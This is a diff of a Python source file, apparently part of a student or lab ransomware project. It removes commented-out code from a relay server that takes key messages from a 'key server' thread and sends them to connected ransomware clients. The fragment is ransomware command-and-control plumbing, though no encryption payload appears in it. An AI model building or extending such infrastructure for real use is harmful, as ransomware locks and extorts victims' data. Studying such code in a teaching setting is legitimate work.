@@ -1,13 +1,9 @@
 import queue
 import threading
-
-# from threading import Thread, Lock
 import utile.network as network
 import utile.message as message
 import utile.security as security
 
-# import utile.input as my_input
-# import utile.config as config
 
 # Constantes
 IP_SERV_CLES = network.LOCAL_IP
@@ -98,7 +94,6 @@ def handle_ransomware():
     ransomware_socket = network.start_net_serv(IP_RANSOMWARE, PORT_RANSOMWARE)
     while True:
         client_socket, address = ransomware_socket.accept()
-        print("Hello, I am the ransomware")
         client_thread = threading.Thread(target=handle_client, args=(client_socket,))
         client_thread.start()
 
@@ -118,23 +113,12 @@ def handle_client(socket_client):
         else:
             while not serv_cles_queue.empty():
                 message_to_ransomware = serv_cles_queue.get()
-                """print("Message à envoyer : ", message_to_ransomware)
-                CONFIG_WORKSTATION['KEY'] = message_to_ransomware['KEY']
-                print(CONFIG_WORKSTATION['KEY'])
-
-                CONFIG_WORKSTATION['HASH'] = message_to_ransomware['KEY_RESP']
-                print(CONFIG_WORKSTATION['HASH'])
-
-                # Passer CONFIG_WORKSTATION en argument à set_message
-                message_to_ransomware = message.set_message("CONFIGURE", CONFIG_WORKSTATION)"""
                 network.send_message(socket_client, message_to_ransomware)
                 print("Message envoyé au ransomware: ", message_to_ransomware)
 
 
 def main():
     global CONFIG_SERVEUR, CONFIG_WORKSTATION
-    # CONFIG_SERVEUR = config.load_config('config/serveur.cfg', 'config/key_serveur.bin')
-    # CONFIG_WORKSTATION = config.load_config('config/workstation.cfg', 'config/key_workstation.bin')
     serv_cle = threading.Thread(target=handle_serv_cles)
     serv_cle.start()
     ransomware = threading.Thread(target=handle_ransomware)
